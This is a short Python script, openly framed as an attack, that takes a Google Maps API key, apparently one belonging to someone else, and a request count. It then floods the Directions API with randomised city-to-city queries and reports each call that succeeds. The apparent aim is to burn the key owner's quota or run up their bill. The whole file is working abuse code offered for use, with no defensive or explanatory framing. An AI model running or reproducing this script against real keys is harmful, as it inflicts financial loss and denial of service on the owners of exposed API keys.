#!/usr/bin/python3
import requests, warnings, json, sys, os, random, colorama
from colorama import Fore
requests.packages.urllib3.disable_warnings()
colorama.init(autoreset=True)

def get_searchterm():
    city1 = open("datasets/cities.txt","r")
    city_line1 = next(city1)

    city2 = open("datasets/cities.txt","r")
    city_line2 = next(city2)

    for i, c_line1 in enumerate(city1,2):
        if random.randrange(i):
            continue
        city_line1 = c_line1

    for j, c_line2 in enumerate(city2,2):
        if random.randrange(j):
            continue
        city_line2 = c_line2

    return f"destination=side_of_road:{city_line1.strip()}&origin={city_line2.strip()}"

def generate_url(apikey, term):
    return f"https://maps.googleapis.com/maps/api/directions/json?{term}&key={apikey}"

def do_attack():
    apikey = str(input("Enter Google Maps API Key that vulnerable to advanced directions: "))
    count = int(input("Enter packet count: "))
    print (Fore.GREEN + "[+] Sending Packets")
    for i in range(count):
        url = generate_url(apikey, get_searchterm())
        response = requests.get(url, verify=False)
        if response.text.find("error_message") < 0:
            print(Fore.GREEN + f"[+] Packet sequence-{i+1} Succeed: No Error Message")
        else:
            print(Fore.RED + f"[-] Packet sequence-{i+1} Failed: Error Message Exist")

if __name__ == "__main__":
    do_attack()
